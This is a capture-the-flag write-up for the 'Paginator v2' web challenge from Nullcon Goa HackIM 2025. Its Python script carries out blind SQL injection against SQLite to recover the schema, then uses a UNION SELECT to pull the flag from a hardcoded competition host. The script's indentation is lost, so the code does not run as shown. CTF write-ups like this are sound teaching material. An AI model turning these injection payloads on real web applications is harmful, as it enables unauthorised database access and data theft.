---
title: "Paginator v2 - Nullcon Goa HackIM 2025 CTF"
category: "web"
subcategory: "sqli"
type: "writeup"
tags: ["web", "sqli", "union-select", "blind-sqli", "sqlite", "paginator", "nullcon-goa-hackim-2025-ctf", "2025", "ctf-writeup"]
summary: "Use blind SQL injection to determine the table name, table schema."
source:
  name: "CTFtime writeup #39913"
  url: "https://ctftime.org/writeup/39913"
original_source: "https://hackmd.io/@Jm6TApV6RIqYGkPXof9GJA/BkNKejftkl#Paginator-v2"
ctf:
  name: "Nullcon Goa HackIM 2025 CTF"
  year: 2025
  challenge: "Paginator v2"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2025 CTF
- **Task:** Paginator v2
- **Author team:** Infobahn
- **CTFtime:** <https://ctftime.org/writeup/39913>
- **Original writeup:** <https://hackmd.io/@Jm6TApV6RIqYGkPXof9GJA/BkNKejftkl#Paginator-v2>

---
Use blind SQL injection to determine the table name, table schema. Then, becuase there are only 2 fields in `flag` table, use `UNION SELECT * FROM flag` to get the flag.

```python=  
import requests  
import string

URL = "http://52.59.124.14:5015/"

s = requests.session()

def query(q: str,s):  
print(q)  
x = f"2 AND {q}"

r = s.get(URL, params={  
"p": "2," + x  
})  
return "Page 2" in r.text

# known = ""  
# while True:  
# for c in string.printable:  
# # cur = (known + c).replace("_", "\\\\_").replace("%", "\\\%")  
# cur = (known + c)  
# if query(f"(SELECT count(*) FROM sqlite_master WHERE tbl_name ='flag' AND sql LIKE '{cur}%')>0", s):  
# print(cur)  
# known = known + c  
# break

r = s.get(URL, params={  
"p": "2,2 UNION SELECT * FROM flag"  
})  
print(r.text)  
```
